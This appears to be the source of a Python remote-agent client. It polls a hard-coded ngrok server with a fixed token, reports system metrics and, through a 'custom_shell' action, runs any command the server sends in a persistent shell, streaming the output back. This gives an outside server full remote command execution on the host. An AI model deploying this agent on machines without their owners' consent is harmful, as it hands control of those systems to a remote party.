from urllib.parse import urlencode
from urllib.request import Request, urlopen
import argparse
import datetime as dt
import ctypes
import getpass
import json
import locale
import os
import platform
import shutil
import subprocess
import sys
import threading
import time
import uuid


DEFAULT_AGENT_TOKEN = "Agent-Sch00l-Access-2026-X"
DEFAULT_POLL_SECONDS = 0.5

# Persistent shells per client_id
persistent_shells = {}


def parse_args(argv):
    parser = argparse.ArgumentParser(description="Safe Client Panel demo client")
    parser.add_argument(
        "--server-url",
        default=os.environ.get("SERVER_URL", "https://submetallic-dyan-geoidal.ngrok-free.dev"),
        help="Base URL of the server, e.g. http://SERVER_IP:8080 (or set SERVER_URL env var).",
    )
    parser.add_argument(
        "--agent-token",
        default=os.environ.get("AGENT_TOKEN", DEFAULT_AGENT_TOKEN),
        help="Agent token (must match server's AGENT_TOKEN).",
    )
    parser.add_argument(
        "--client-id",
        default=os.environ.get("CLIENT_ID"),
        help="Optional stable client id (defaults to <hostname>-<mac>).",
    )
    parser.add_argument(
        "--client-name",
        default=os.environ.get("CLIENT_NAME"),
        help="Client display name (defaults to hostname).",
    )
    parser.add_argument(
        "--poll-seconds",
        type=float,
        default=float(os.environ.get("POLL_SECONDS", str(DEFAULT_POLL_SECONDS))),
        help="Polling interval in seconds.",
    )
    args = parser.parse_args(argv)

    server_url = (args.server_url or "").strip().rstrip("/")
    if not server_url:
        parser.error("Missing server URL. Provide --server-url or set SERVER_URL.")

    client_id = args.client_id or f"{platform.node()}-{uuid.getnode():x}"
    client_name = args.client_name or platform.node() or "python-client"
    return {
        "server_url": server_url,
        "agent_token": args.agent_token,
        "client_id": client_id,
        "client_name": client_name,
        "poll_seconds": args.poll_seconds,
    }


def request_json(server_url, agent_token, method, path, payload=None):
    data = None
    headers = {"X-Agent-Token": agent_token}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = Request(f"{server_url}{path}", data=data, headers=headers, method=method)
    with urlopen(req, timeout=20) as response:
        return json.loads(response.read().decode("utf-8"))


def command_output_encoding():
    if os.name == "nt":
        try:
            return f"cp{ctypes.windll.kernel32.GetOEMCP()}"
        except Exception:
            pass
    return locale.getpreferredencoding(False) or "utf-8"


def decode_command_output(data):
    if not data:
        return ""
    return data.decode(command_output_encoding(), errors="replace")


def human_bytes(value):
    try:
        size = float(value)
    except Exception:
        return str(value)
    units = ["B", "KB", "MB", "GB", "TB", "PB"]
    idx = 0
    while size >= 1024 and idx < len(units) - 1:
        size /= 1024.0
        idx += 1
    if idx == 0:
        return f"{int(size)} {units[idx]}"
    return f"{size:.1f} {units[idx]}"


def memory_info():
    if os.name == "nt":
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)) == 0:
            raise OSError("GlobalMemoryStatusEx failed")
        return int(stat.ullTotalPhys), int(stat.ullAvailPhys)

    if sys.platform.startswith("linux"):
        try:
            total = avail = None
            with open("/proc/meminfo", "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        total = int(line.split()[1]) * 1024
                    elif line.startswith("MemAvailable:"):
                        avail = int(line.split()[1]) * 1024
                    if total is not None and avail is not None:
                        break
            if total is not None and avail is not None:
                return total, avail
        except Exception:
            pass

    try:
        page = os.sysconf("SC_PAGE_SIZE")
        phys = os.sysconf("SC_PHYS_PAGES")
        total = int(page) * int(phys)
        return total, 0
    except Exception:
        return 0, 0


def disk_usage(path):
    usage = shutil.disk_usage(path)
    return int(usage.total), int(usage.used), int(usage.free)


def cpu_usage_percent():
    if os.name == "nt":
        script = "(Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average"
        ok, out = run_process(["powershell", "-NoProfile", "-Command", script])
        if not ok:
            return None
        try:
            return float(out.strip())
        except Exception:
            return None

    if sys.platform.startswith("linux"):
        def read_proc_stat():
            with open("/proc/stat", "r", encoding="utf-8", errors="replace") as f:
                first = f.readline()
            parts = first.split()
            if len(parts) < 8 or parts[0] != "cpu":
                return None
            values = [int(x) for x in parts[1:]]
            total = sum(values)
            idle = values[3] + (values[4] if len(values) > 4 else 0)
            return total, idle

        a = read_proc_stat()
        if not a:
            return None
        time.sleep(0.22)
        b = read_proc_stat()
        if not b:
            return None
        total_delta = b[0] - a[0]
        idle_delta = b[1] - a[1]
        if total_delta <= 0:
            return None
        busy = 100.0 * (1.0 - (idle_delta / float(total_delta)))
        return max(0.0, min(100.0, busy))

    return None


def cpu_temp_c():
    if os.name == "nt":
        script = (
            "$t = Get-CimInstance -Namespace root/wmi -ClassName MSAcpi_ThermalZoneTemperature "
            "| Select-Object -First 1 -ExpandProperty CurrentTemperature; "
            "if ($null -eq $t) { '' } else { [math]::Round(($t / 10.0) - 273.15, 1) }"
        )
        ok, out = run_process(["powershell", "-NoProfile", "-Command", script])
        if not ok:
            return None
        out = out.strip()
        if not out:
            return None
        try:
            return float(out)
        except Exception:
            return None

    if sys.platform.startswith("linux"):
        base = "/sys/class/thermal"
        try:
            best = None
            for name in os.listdir(base):
                if not name.startswith("thermal_zone"):
                    continue
                temp_path = os.path.join(base, name, "temp")
                try:
                    raw = open(temp_path, "r", encoding="utf-8", errors="replace").read().strip()
                    if not raw:
                        continue
                    v = int(raw)
                    c = v / 1000.0 if v > 1000 else float(v)
                    if best is None or c > best:
                        best = c
                except Exception:
                    continue
            if best is not None:
                return float(round(best, 1))
        except Exception:
            pass
    return None


def top_mem_processes(limit):
    limit = max(1, min(30, int(limit)))
    if os.name == "nt":
        script = (
            f"Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First {limit} "
            "Id,ProcessName,@{Name='MB';Expression={[math]::Round($_.WorkingSet/1MB,1)}} "
            "| Format-Table -AutoSize | Out-String -Width 200"
        )
        ok, out = run_process(["powershell", "-NoProfile", "-Command", script])
        if not ok:
            return False, out
        return True, out.strip()

    ok, out = run_process(["ps", "-eo", "pid,comm,rss", "--sort=-rss"])
    if not ok:
        return False, out
    lines = out.splitlines()
    keep = lines[: limit + 1] if lines else []
    return True, "\n".join(keep).strip()


def now_iso_utc():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def collect_metrics_sample():
    total, avail = memory_info()
    cpu = cpu_usage_percent()
    temp = cpu_temp_c()

    disk_used = disk_total = None
    try:
        default_path = (os.path.splitdrive(os.getcwd())[0] + "\\") if os.name == "nt" else "/"
        d_total, d_used, _ = disk_usage(default_path)
        disk_total, disk_used = int(d_total), int(d_used)
    except Exception:
        pass

    sample = {
        "at": now_iso_utc(),
        "cpu": cpu,
        "ram_used": (total - avail) if total else None,
        "ram_total": total or None,
        "cwd": os.getcwd(),
        "temp": temp,
        "disk_used": disk_used,
        "disk_total": disk_total,
    }
    return sample


def run_process(args):
    completed = subprocess.run(
        args,
        capture_output=True,
        timeout=12,
        shell=False,
    )
    output = decode_command_output(completed.stdout).strip()
    error = decode_command_output(completed.stderr).strip()
    if error:
        output = f"{output}\n{error}".strip()
    return completed.returncode == 0, output or f"Exit code: {completed.returncode}"


def run_shell_command_old(command_text, on_chunk=None):
    """Оригинальная одноразовая версия (fallback)"""
    encoding = command_output_encoding()
    process = subprocess.Popen(
        command_text,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        shell=True,
        text=True,
        encoding=encoding,
        errors="replace",
        bufsize=1,
    )

    all_output = []
    pending_chunks = []
    last_flush = time.monotonic()
    streamed = False

    def flush(force=False):
        nonlocal last_flush, streamed
        if not on_chunk or not pending_chunks:
            return
        now = time.monotonic()
        if not force and now - last_flush < 0.45 and len(pending_chunks) < 6:
            return
        chunk = "".join(pending_chunks)
        pending_chunks.clear()
        last_flush = now
        streamed = True
        on_chunk(chunk)

    try:
        if process.stdout is not None:
            for line in process.stdout:
                all_output.append(line)
                pending_chunks.append(line)
                flush()
        code = process.wait()
        flush(force=True)
    except Exception:
        process.kill()
        code = process.wait()
        raise

    output = "".join(all_output).strip()
    if streamed:
        summary = f"Command finished with exit code: {code}"
        return code == 0, summary
    return code == 0, output or f"Exit code: {code}"


def run_shell_command(command_text, on_chunk=None, client_id=None, server_url=None, agent_token=None, task_id=None):
    """Persistent shell версия"""
    command_text = command_text.strip()
    if not command_text:
        return False, "Empty command"

    global persistent_shells
    cancel_event = threading.Event()

    def is_cancelled():
        if not (server_url and agent_token and client_id and task_id):
            return False
        try:
            query = urlencode({"client_id": client_id, "task_id": task_id})
            payload = request_json(server_url, agent_token, "GET", f"/api/cancelled?{query}")
            return payload.get("cancel") is True
        except Exception:
            return False

    # Создаём persistent shell, если его ещё нет
    if client_id and client_id not in persistent_shells:
        encoding = command_output_encoding()
        if os.name == "nt":
            # Для Windows используем cmd.exe
            shell_cmd = ["cmd.exe", "/Q", "/K"]
        else:
            # Для Linux/macOS используем bash
            shell_cmd = ["bash"]

        process = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            text=True,
            encoding=encoding,
            errors="replace",
            bufsize=1,
            universal_newlines=True,
        )
        persistent_shells[client_id] = process
        print(f"[Persistent shell started for client: {client_id}]")

    if client_id and client_id in persistent_shells:
        process = persistent_shells[client_id]

        def kill_shell():
            try:
                if os.name == "nt":
                    subprocess.run(
                        ["taskkill", "/PID", str(process.pid), "/T", "/F"],
                        capture_output=True,
                        timeout=8,
                        shell=False,
                    )
                else:
                    process.terminate()
            except Exception:
                try:
                    process.kill()
                except Exception:
                    pass
            persistent_shells.pop(client_id, None)

        if server_url and agent_token and task_id:
            def watcher():
                while True:
                    if cancel_event.is_set():
                        return
                    if process.poll() is not None:
                        return
                    if is_cancelled():
                        cancel_event.set()
                        kill_shell()
                        return
                    time.sleep(0.4)

            threading.Thread(target=watcher, name="cancel_watcher", daemon=True).start()

        # Добавляем маркер окончания команды
        marker = f"__CMD_DONE_{uuid.uuid4().hex[:8]}__"
        if os.name == "nt":
            full_cmd = f"{command_text}\necho {marker}\r\n"
        else:
            full_cmd = f"{command_text}\necho {marker}\n"

        try:
            process.stdin.write(full_cmd)
            process.stdin.flush()
        except Exception as e:
            # Если shell умер — удаляем его
            persistent_shells.pop(client_id, None)
            return False, f"Shell communication error: {e}"

        # Читаем вывод до маркера
        all_output = []
        while True:
            try:
                line = process.stdout.readline()
                if not line:
                    break
                all_output.append(line)
                if on_chunk:
                    on_chunk(line)

                if marker in line:
                    break
            except Exception:
                break

        output = "".join(all_output).replace(marker, "").strip()
        if cancel_event.is_set():
            return False, "Command stopped."

        # Проверяем, жив ли процесс
        if process.poll() is not None:
            persistent_shells.pop(client_id, None)
            return False, "Persistent shell process has died"

        return True, output or f"Command executed successfully (exit code 0)"

    # Fallback на старую версию
    return run_shell_command_old(command_text, on_chunk)


def execute(task, on_chunk=None, client_id=None, server_url=None, agent_token=None, task_id=None):
    action = task.get("action")
    argument = task.get("argument", "")

    if action == "hostname":
        return True, platform.node()
    if action == "whoami":
        return True, getpass.getuser()
    if action == "cwd":
        return True, os.getcwd()
    if action == "date":
        return True, dt.datetime.now().isoformat(timespec="seconds")
    if action == "list_current_dir":
        names = sorted(os.listdir(os.getcwd()))
        return True, "\n".join(names) if names else "Directory is empty"
    if action == "mem":
        total, avail = memory_info()
        if not total:
            return False, "Memory info is not available on this system"
        used = max(0, total - avail)
        pct = (used / total * 100.0) if total else 0.0
        return True, f"RAM used: {human_bytes(used)} / {human_bytes(total)} ({pct:.1f}%)\nRAM available: {human_bytes(avail)}"
    if action == "disk":
        path = argument.strip()
        if not path:
            path = (os.path.splitdrive(os.getcwd())[0] + "\\") if os.name == "nt" else "/"
        try:
            total, used, free = disk_usage(path)
        except Exception as exc:
            return False, f"Disk usage error for '{path}': {exc}"
        pct = (used / total * 100.0) if total else 0.0
        return True, f"Disk '{path}': used {human_bytes(used)} / {human_bytes(total)} ({pct:.1f}%), free {human_bytes(free)}"
    if action == "cpu":
        cpu = cpu_usage_percent()
        if cpu is None:
            return False, "CPU usage is not available on this system"
        return True, f"CPU usage: {cpu:.1f}%"
    if action == "cpu_temp":
        temp = cpu_temp_c()
        if temp is None:
            return False, "CPU temperature is not available on this system"
        return True, f"CPU temperature: {temp:.1f} C"
    if action == "top_mem":
        raw = argument.strip()
        limit = 10
        if raw:
            try:
                limit = int(raw)
            except Exception:
                return False, "Argument must be a number (N), e.g. top_mem 10"
        return top_mem_processes(limit)
    if action == "stats":
        lines = []
        total, avail = memory_info()
        if total:
            used = max(0, total - avail)
            lines.append(f"RAM: {human_bytes(used)} / {human_bytes(total)} ({(used/total*100.0):.1f}%)")
        else:
            lines.append("RAM: unavailable")

        cpu = cpu_usage_percent()
        lines.append(f"CPU usage: {cpu:.1f}%" if cpu is not None else "CPU usage: unavailable")

        temp = cpu_temp_c()
        lines.append(f"CPU temp: {temp:.1f} C" if temp is not None else "CPU temp: unavailable")

        try:
            default_path = (os.path.splitdrive(os.getcwd())[0] + "\\") if os.name == "nt" else "/"
            d_total, d_used, d_free = disk_usage(default_path)
            lines.append(
                f"Disk {default_path}: {human_bytes(d_used)} / {human_bytes(d_total)} ({(d_used/d_total*100.0):.1f}%), free {human_bytes(d_free)}"
            )
        except Exception:
            lines.append("Disk: unavailable")

        lines.append(f"OS: {platform.platform()}")
        return True, "\n".join(lines)
    if action == "echo":
        return True, argument
    if action == "ipconfig":
        if os.name != "nt":
            return False, "ipconfig is available only on Windows clients"
        return run_process(["ipconfig"])
    if action == "custom_shell":
        command_text = argument.strip()
        if not command_text:
            return False, "Custom command is empty"
        return run_shell_command(
            command_text,
            on_chunk=on_chunk,
            client_id=client_id,
            server_url=server_url,
            agent_token=agent_token,
            task_id=task_id,
        )

    # Новая команда для сброса shell
    if action == "reset_shell":
        if client_id and client_id in persistent_shells:
            try:
                persistent_shells[client_id].kill()
            except:
                pass
            persistent_shells.pop(client_id, None)
            return True, "Persistent shell has been reset successfully."
        return True, "No persistent shell was running."

    return False, "Command is not allowed by this client"


def main():
    cfg = parse_args(sys.argv[1:])
    server_url = cfg["server_url"]
    agent_token = cfg["agent_token"]
    client_id = cfg["client_id"]
    client_name = cfg["client_name"]
    poll_seconds = cfg["poll_seconds"]
    last_metrics_ts = 0.0

    print(f"Client '{client_name}' (ID: {client_id}) connected to {server_url}")
    print("Press Ctrl+C to stop.")
    print("Persistent shell is enabled — cd, pip install, export etc. will work persistently.")

    while True:
        try:
            query = urlencode({"client_id": client_id, "name": client_name})
            payload = request_json(server_url, agent_token, "GET", f"/api/poll?{query}")
            task = payload.get("task")

            if task:
                task_id = str(task.get("id", ""))

                def on_chunk(chunk):
                    try:
                        request_json(
                            server_url,
                            agent_token,
                            "POST",
                            "/api/progress",
                            {
                                "client_id": client_id,
                                "task_id": task_id,
                                "action": task.get("action"),
                                "chunk": chunk,
                            },
                        )
                    except Exception:
                        return

                ok, output = execute(
                    task,
                    on_chunk=on_chunk if task.get("action") == "custom_shell" else None,
                    client_id=client_id,
                    server_url=server_url,
                    agent_token=agent_token,
                    task_id=task_id,
                )

                request_json(
                    server_url,
                    agent_token,
                    "POST",
                    "/api/result",
                    {
                        "client_id": client_id,
                        "task_id": task_id,
                        "action": task.get("action"),
                        "ok": ok,
                        "output": output,
                    },
                )

            # Push metrics
            now = time.monotonic()
            if now - last_metrics_ts >= 2.0:
                last_metrics_ts = now
                try:
                    request_json(
                        server_url,
                        agent_token,
                        "POST",
                        "/api/metrics",
                        {"client_id": client_id, "sample": collect_metrics_sample()},
                    )
                except Exception:
                    pass

        except KeyboardInterrupt:
            print("\nClient stopped.")
            # Cleanup persistent shells
            for proc in persistent_shells.values():
                try:
                    proc.kill()
                except:
                    pass
            return 0
        except Exception as exc:
            print(f"Connection error: {exc}", file=sys.stderr)
            time.sleep(5)
        time.sleep(poll_seconds)


if __name__ == "__main__":
    raise SystemExit(main())
